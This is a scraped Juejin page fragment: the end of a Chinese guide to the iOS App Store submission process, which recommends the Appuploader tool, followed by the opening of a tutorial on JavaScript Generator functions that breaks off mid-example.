p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>对于任何移动应用项目来说，将应用成功提交到 App Store，是整个生命周期中最关键的环节之一。与 Android 的开放式发布不同，iOS 商店上架过程涉及更严格的规范、更复杂的签名体系，以及更系统化的审核要求。如果缺乏清晰的流程设计，即使应用本身没有技术问题，也可能在提交阶段反复退回。</p>
<p>这篇文章从工程视角总结一次完整的 iOS 商店上架路径，包括账号准备、证书体系、构建、上传、素材配置与审核阶段的关键点，适用于跨平台项目、原生项目、企业 App 与独立开发者场景。</p>
<hr/>
<h2 data-id="heading-0"><strong>一、App Store 上架基础：账号、权限与应用条目创建</strong></h2>
<p>iOS 商店上架的前置工作主要集中在 Apple Developer 平台与 App Store Connect。</p>
<h3 data-id="heading-1"><strong>1. Apple Developer Program（开发者账号）</strong></h3>
<p>这是所有上架动作的前提。
无论是个人还是企业，都必须具备：</p>
<ul>
<li>证书管理权限</li>
<li>App ID 创建权限</li>
<li>App Store Connect 管理权限</li>
</ul>
<p>账号费用为 99 美元/年，是唯一固定成本。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09dfb95112134caab9c210aefb991d76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMDDlkI7nqIvluo_lkZg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764576110&amp;x-signature=KrK8W7A9QLyzORim4%2FOLP%2BdKY94%3D" alt="会员注册" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-2"><strong>2. 创建 App ID（应用唯一标识）</strong></h3>
<p>每个 iOS 应用必须具有唯一的 Bundle ID，例如：</p>
<pre><code class="hljs">com.company.project
</code></pre>
<p>Bundle ID 与签名、描述文件、构建版本关联，因此必须提前确定，并在整个项目中保持一致。</p>
<hr/>
<h3 data-id="heading-3"><strong>3. App Store Connect 创建应用条目</strong></h3>
<p>需准备：</p>
<ul>
<li>应用名称</li>
<li>分类（主、副类）</li>
<li>SKU</li>
<li>Bundle ID 绑定</li>
<li>隐私政策链接</li>
</ul>
<p>条目创建后，即可进行后续构建上传。</p>
<hr/>
<h2 data-id="heading-4"><strong>二、iOS 证书体系：构建与上架的基础结构</strong></h2>
<p>iOS 签名体系由三部分组成：</p>
<ul>
<li>发布证书（Distribution Certificate）</li>
<li>App Store 描述文件</li>
<li>App ID 与团队信息</li>
</ul>
<p>误操作证书是开发者最常遇到的问题之一，尤其是在多人协作或跨平台场景中。</p>
<hr/>
<h3 data-id="heading-5"><strong>1. 多系统证书生成的实践</strong></h3>
<p>传统方式必须依赖 macOS，但现代工具链 开心上架（Appuploader）允许在 Windows、Linux 与 macOS 上生成完整证书，例如：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48ab37ad004247cf90ded8b6dad36695~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMDDlkI7nqIvluo_lkZg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764576110&amp;x-signature=bpOyyUm%2BrBHM9HQwkb4uC9irHq0%3D" alt="证书" loading="lazy"/></p>
<p>输出：</p>
<ul>
<li>p12 发布证书</li>
<li>描述文件</li>
</ul>
<p>证书在团队中可跨系统共享，用于构建 IPA。</p>
<hr/>
<h2 data-id="heading-6"><strong>三、构建 IPA：根据技术栈的不同选择不同流程</strong></h2>
<p>构建阶段的差异主要来自技术栈。</p>
<hr/>
<h3 data-id="heading-7"><strong>1. 原生 iOS（Swift / Objective-C）</strong></h3>
<p>只能在 macOS + Xcode 环境构建：</p>
<ul>
<li>Xcode → Archive</li>
<li>Export → App Store</li>
</ul>
<p>适用于中大型项目与企业应用。</p>
<hr/>
<h3 data-id="heading-8"><strong>2. uni-app / HBuilderX</strong></h3>
<p>构建优势：</p>
<ul>
<li>不依赖 Mac</li>
<li>云构建生成 IPA</li>
<li>适合中小团队与个人开发者</li>
<li>打包速度快，适合频繁迭代审核的场景</li>
</ul>
<p>uni-app 项目上架 iOS 的工程链路比原生更轻量。</p>
<hr/>
<h3 data-id="heading-9"><strong>3. Flutter / React Native</strong></h3>
<p>跨平台工程通常使用：</p>
<ul>
<li>Codemagic</li>
<li>Appcircle</li>
<li>GitHub Actions（Mac Runner）</li>
</ul>
<p>云构建能避免本地环境依赖，也减少苹果生态的硬件成本。</p>
<hr/>
<h2 data-id="heading-10"><strong>四、上传 IPA：从 Transporter 到跨系统命令行</strong></h2>
<p>上传是 iOS 商店上架的重要步骤。传统上只能在 macOS 完成，但现代团队更倾向于跨系统命令行上传，因为它能与构建流水线集成。</p>
<hr/>
<h3 data-id="heading-11"><strong>1. 官方方式（仅 macOS）</strong></h3>
<ul>
<li>Transporter</li>
<li>Xcode Organizer</li>
</ul>
<p>优点：稳定
缺点：局限于 Mac</p>
<hr/>
<h3 data-id="heading-12"><strong>2. 跨系统命令行上传（Windows / Linux / macOS 通用）</strong></h3>
<p>适合云构建、CI/CD 以及团队协作：</p>
<pre><code class="hljs language-css" lang="css">appuploader_cli -u dev<span class="hljs-keyword">@icloud</span>.com -p xxx-xxx-xxx-xxx -c <span class="hljs-number">2</span> -f app.ipa
</code></pre>
<p>特点：</p>
<ul>
<li>无需 Mac</li>
<li>支持旧/新上传通道</li>
<li>错误日志清晰</li>
<li>适用于多人协作与自动化发布</li>
</ul>
<p>对于频繁经历审核回退的应用，这类方式可以显著减少迭代时间。
同时支持图形化界面：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba71c0d80b964b7b925ae489f5941e7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMDDlkI7nqIvluo_lkZg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764576110&amp;x-signature=eELt95A79hvrgSU4mNS7n39LRGk%3D" alt="IPA上传" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-13"><strong>五、App Store Connect 配置阶段：决定审核质量的关键部分</strong></h2>
<p>应用上传成功后，会进入配置阶段。此阶段内容直接影响审核结果。</p>
<h3 data-id="heading-14"><strong>1. 上架素材</strong></h3>
<p>包括：</p>
<ul>
<li>截图（不同设备尺寸）</li>
<li>1024 图标</li>
<li>预览视频（可选）</li>
<li>关键字、描述、隐私政策</li>
</ul>
<p>截图必须与实际页面一致，不能夸大功能。</p>
<hr/>
<h3 data-id="heading-15"><strong>2. 权限用途说明</strong></h3>
<p>必须在 Info.plist 中声明，例如：</p>
<ul>
<li>NSCameraUsageDescription</li>
<li>NSMicrophoneUsageDescription</li>
<li>NSLocationUsageDescription</li>
</ul>
<p>缺失或描述不合理会直接拒审。</p>
<hr/>
<h3 data-id="heading-16"><strong>3. 隐私与数据合规性</strong></h3>
<p>从 iOS 14 开始，必须填写：</p>
<ul>
<li>数据收集类型</li>
<li>使用目的</li>
<li>与第三方 SDK 的数据流向</li>
</ul>
<p>该部分是审核重点。</p>
<hr/>
<h3 data-id="heading-17"><strong>4. 内购（如有）</strong></h3>
<p>若 App 使用 IAP：</p>
<ul>
<li>必须在沙箱可正常购买</li>
<li>商品配置必须完整</li>
<li>UI 引导必须明确</li>
</ul>
<p>IAP 是审核耗时与拒审风险较高的环节。</p>
<hr/>
<h2 data-id="heading-18"><strong>六、审核阶段：耗时与风险并存的流程</strong></h2>
<p>审核阶段由人工审核与自动检查组成。</p>
<h3 data-id="heading-19"><strong>1. 常规审核时间</strong></h3>
<ul>
<li>普通应用：1–3 天</li>
<li>游戏、社交类：3–7 天</li>
<li>金融、医疗类：5–10 天</li>
</ul>
<h3 data-id="heading-20"><strong>2. 常见拒审原因</strong></h3>





























<table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>功能不可用</td><td>登录失败、按钮无反应</td></tr><tr><td>权限用途说明缺失</td><td>审核员无法通过权限提示</td></tr><tr><td>截图与实际不符</td><td>UI 差异过大</td></tr><tr><td>数据收集声明不完整</td><td>与提交的内容冲突</td></tr><tr><td>内购流程失败</td><td>无法购买或商品不存在</td></tr></tbody></table>
<p>拒审会显著延长上架周期，因此工程侧应提前进行全面自测。</p>
<hr/>
<h2 data-id="heading-21"><strong>七、发布阶段：从审核通过到正式上线</strong></h2>
<p>审核通过后，App 可选择：</p>
<ul>
<li>立即上线</li>
<li>手动上线</li>
<li>定时上线</li>
</ul>
<p>对于企业团队及高风险类应用，建议使用「手动发布」，以便上线前进行最后一次验证。</p>
<hr/>
<h2 data-id="heading-22"><strong>八、总结：iOS 商店上架是流程工程，而不是简单上传</strong></h2>
<p>回顾整个流程：</p>
<ol>
<li>账号与权限</li>
<li>证书体系</li>
<li>构建 IPA</li>
<li>上传构建</li>
<li>配置信息</li>
<li>审核流程</li>
<li>发布上线</li>
</ol>
<p>每一个环节都可能造成延迟或被退回，因此 App Store 上架绝不是“提交一下就完事”的流程，而是一条完整的工程链路。</p>
<p>跨平台构建与跨系统上传工具能显著降低时间消耗，提高整个团队的上架效率。
参考链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.applicationloader.net%2Ftutorial%2Fzh%2F1%2F1.html" target="_blank" title="https://www.applicationloader.net/tutorial/zh/1/1.html" ref="nofollow noopener noreferrer">www.applicationloader.net/tutorial/zh…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Generator 在 JavaScript 中的应用与优势]]></title>    <link>https://juejin.cn/post/7575810396201418786</link>    <guid>https://juejin.cn/post/7575810396201418786</guid>    <pubDate>2025-11-24T06:19:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575810396201418786" data-draft-id="7575810396201402402" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Generator 在 JavaScript 中的应用与优势"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T06:19:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大知闲闲i"/> <meta itemprop="url" content="https://juejin.cn/user/3799545205237111"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Generator 在 JavaScript 中的应用与优势
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3799545205237111/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大知闲闲i
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:19:23.000Z" title="Mon Nov 24 2025 06:19:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">（Generator）：原理与实战场景</h3>
<p>在 JavaScript ES6 引入的众多特性中，生成器（Generator）无疑是最具创造性的特性之一。它打破了传统函数“一次性执行完毕”的固有模式，带来了“暂停执行、分段返回”的全新编程体验。对于前端开发者而言，掌握 Generator 不仅能解决异步编程、迭代器构建等实际问题，更能深入理解 JavaScript 的异步模型与迭代机制。本文将从核心概念、工作原理、语法规则到实战场景，全面解析 Generator 的价值与应用。</p>
<h2 data-id="heading-1">一、Generator 是什么？—— 打破常规的“可控函数”</h2>
<p>Generator 本质是一种<strong>可以暂停执行、按需恢复</strong>的特殊函数，它能在执行过程中多次返回中间结果，而不是一次性返回最终值。从形式上看，Generator 函数有两个显著特征：</p>
<ol>
<li>
<p>函数声明时带有 <code>function*</code> 关键字（注意 <code>*</code> 位置可在 <code>function</code> 与函数名之间任意位置，推荐紧跟 <code>function</code>）；</p>
</li>
<li>
<p>函数体内部使用 <code>yield</code> 关键字标记暂停点，每次执行到 <code>yield</code> 时会返回当前值并暂停；</p>
</li>
<li>
<p>调用 Generator 函数不会立即执行函数体，而是返回一个<strong>迭代器对象（Generator 对象）</strong>，通过该对象的 <code>next()</code> 方法控制函数执行。</p>
</li>
</ol>
<h3 data-id="heading-2">核心语法示例</h3>
<pre><code class="hljs language-lua" lang="lua">// 定义 Generator 函数
<span class="hljs-function"><span class="hljs-keyword">function</span>* <span class="hljs-title">numberGenerator</span><span class="hljs-params">()</span></span> {
  <span class="hljs-built_in">yield</span> <span class="hljs-number">1</span>; // 第一个暂停点，返回 <span class="hljs-number">1</span>
  <span class="hljs-built_in">yield</span> <span class="hljs-number">2</span>; // 第二个暂停点，返回 <span class="hljs-number">2</span>
  <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>; // 最终返回值（迭代器 done 为 <span class="hljs-literal">true</span> 时返回）
}
​
// 调用 Generator 函数，返回迭代器对象（函数体未执行）
const generator = numberGenerator();
​
// 通过 <span class="hljs-built_in">next</span>() 方法控制执行
console.<span class="hljs-built_in">log</span>(generator.<span class="hljs-built_in">next</span>()); // { value: <span class="hljs-number">1</span>, done: <span class="hljs-literal">false</span> }（执行到第一个 <span class="hljs-built_in">yield</span>，暂停）
console.<span class="hljs-built_in">log</span>(generator.<span class="hljs-built_in">next</span>()); // { value: <span class="hljs-number">2</span>, done: <span class="hljs-literal">false</span> }（执行到第二个 <span class="hljs-built_in">yield</span>，暂停）
console.<span class="hljs-built_in">log</span>(generator.<span class="hljs-built_in">next</span>()); // { value: <span class="hljs-number">3</span>, done: <span class="hljs-literal">true</span> }（执行到 <span class="hljs-keyword">return</span>，函数结束）
console.<span class="hljs-built_in">log</span>(generator.<span class="hljs-built_in">next</span>()); // { value: undefined, done: <span class="hljs-literal">true</span> }（函数已结束，后续调用均返回 undefined）
</code></pre>
<h3 data-id="heading-3">关键特性解析</h3>
<ol>
<li>
<p><strong>惰性执行</strong>：Generator 函数调用后不会立即执行，只有调用 <code>next()</code> 才会执行到下一个 <code>yield</code> 或 <code>return</code>；</p>
</li>
<li>
<p><strong>状态保存</strong>：每次暂停后，函数的执行上下文（变量、指针位置）会被保存，恢复执行时直接从暂停点继续；</p>
</li>
<li>
<p><strong>双向通信</strong>：<code>next()</code> 方法可以接收参数，作为上一个 <code>yield</code> 表达式的返回值，实现函数内外的数据传递：</p>
<ol>
<li><code>function* echoGenerator() { const msg1 = yield "请输入第一个消息"; const msg2 = yield</code> 你输入的第一个消息是：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>m</mi><mi>s</mi><mi>g</mi><mn>1</mn></mrow><mi mathvariant="normal">‘</mi><mo separator="true">;</mo><mi>r</mi><mi>e</mi><mi>t</mi><mi>u</mi><mi>r</mi><mi>n</mi><mi mathvariant="normal">‘</mi><mtext>你输入的第二个消息是：</mtext></mrow><annotation encoding="application/x-tex">{msg1}`; return` 你输入的第二个消息是：</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">1</span></span><span class="mord">‘</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">re</span><span class="mord mathnormal">t</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">n</span><span class="mord">‘</span><span class="mord cjk_fallback">你输入的第二个消息是：</span></span></span></span></span>{msg2}<code>; } const generator = echoGenerator(); console.log(generator.next()); // { value: "请输入第一个消息", done: false } console.log(generator.next("Hello")); // { value: "你输入的第一个消息是：Hello", done: false } console.log(generator.next("World")); // { value: "你输入的第二个消息是：World", done: true }</code></li>
</ol>
</li>
<li>
<p><strong>可迭代性</strong>：Generator 函数返回的迭代器对象实现了 <code>Iterable</code> 接口，可直接用于 <code>for...of</code> 循环（自动遍历所有 <code>yield</code> 返回值，忽略 <code>return</code> 最终值）：</p>
<ol>
<li><code>for (const value of numberGenerator()) { console.log(value); // 依次输出 1、2（不输出 3） }</code></li>
</ol>
</li>
</ol>
<h2 data-id="heading-4">二、Generator 的工作原理——迭代器与暂停机制</h2>
<p>要理解 Generator，需先明确两个核心概念：<strong>迭代器（Iterator）</strong> 和 <strong>暂停点（Suspend Point）</strong>。</p>
<h3 data-id="heading-5">1. 迭代器协议基础</h3>
<p>JavaScript 中，迭代器是一个实现了 <code>next()</code> 方法的对象，该方法返回包含 <code>value</code>（当前值）和 <code>done</code>（是否完成）的对象。Generator 函数的本质是<strong>迭代器生成器</strong>——调用后返回的 Generator 对象，正是一个符合迭代器协议的对象。</p>
<p>这意味着 Generator 天然解决了“自定义迭代逻辑”的问题，无需手动实现 <code>next()</code> 方法和迭代器接口。</p>
<h3 data-id="heading-6">2. 暂停与恢复的底层逻辑</h3>
<p>当调用 <code>next()</code> 方法时，Generator 函数会执行到最近的 <code>yield</code> 语句：</p>
<ul>
<li>
<p>执行 <code>yield 表达式</code> 时，会将表达式结果作为 <code>value</code> 返回，并暂停函数执行，保存当前执行上下文（包括变量值、代码执行位置）；</p>
</li>
<li>
<p>再次调用 <code>next(arg)</code> 时，会将 <code>arg</code> 作为上一个 <code>yield</code> 表达式的返回值，恢复执行上下文，继续执行到下一个 <code>yield</code> 或函数结束；</p>
</li>
<li>
<p>当执行到 <code>return</code> 语句或函数末尾时，返回 <code>done: true</code>，后续调用 <code>next()</code> 均返回 <code>{ value: undefined, done: true }</code>。</p>
</li>
</ul>
<p>简单来说，Generator 函数通过 <code>yield</code> 构建了多个“执行片段”，<code>next()</code> 方法则是触发这些片段执行的“开关”。</p>
<h2 data-id="heading-7">三、Generator 的核心应用场景——从理论到实战</h2>
<p>Generator 的“暂停执行”和“分段返回”特性，使其在多个场景中具备独特优势，尤其在异步编程、迭代器构建、状态管理等领域发挥重要作用。</p>
<h3 data-id="heading-8">1. 异步编程——替代回调地狱（ES6 时代的异步方案）</h3>
<p>在 <code>async/await</code> 出现之前，Generator 是解决回调地狱的重要方案。通过 <code>yield</code> 暂停异步操作，<code>next()</code> 恢复执行，可将异步代码写得像同步代码一样清晰。</p>
<h4 data-id="heading-9">示例：用 Generator 处理异步请求</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟异步请求</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params">url</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`从 <span class="hljs-subst">${url}</span> 获取的数据`</span>);
    }, <span class="hljs-number">1000</span>);
  });
}
​
<span class="hljs-comment">// Generator 异步流程控制</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">asyncGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"开始请求数据"</span>);
  <span class="hljs-keyword">const</span> data1 = <span class="hljs-keyword">yield</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data1"</span>); <span class="hljs-comment">// 暂停，等待异步结果</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"第一个请求结果："</span>, data1);
  <span class="hljs-keyword">const</span> data2 = <span class="hljs-keyword">yield</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data2"</span>); <span class="hljs-comment">// 再次暂停</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"第二个请求结果："</span>, data2);
  <span class="hljs-keyword">return</span> <span class="hljs-string">"所有请求完成"</span>;
}
​
<span class="hljs-comment">// 执行 Generator 异步流程（需要手动驱动或使用工具库如 co）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">runGenerator</span>(<span class="hljs-params">generator</span>) {
  <span class="hljs-keyword">const</span> iterator = <span class="hljs-title function_">generator</span>();
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResult</span>(<span class="hljs-params">result</span>) {
    <span class="hljs-keyword">if</span> (result.<span class="hljs-property">done</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"最终结果："</span>, result.<span class="hljs-property">value</span>);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 处理 yield 返回的 Promise</span>
    result.<span class="hljs-property">value</span>.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
      <span class="hljs-title function_">handleResult</span>(iterator.<span class="hljs-title function_">next</span>(data)); <span class="hljs-comment">// 将异步结果传入 next()，恢复执行</span>
    });
  }
  <span class="hljs-title function_">handleResult</span>(iterator.<span class="hljs-title function_">next</span>());
}
​
<span class="hljs-comment">// 启动异步流程</span>
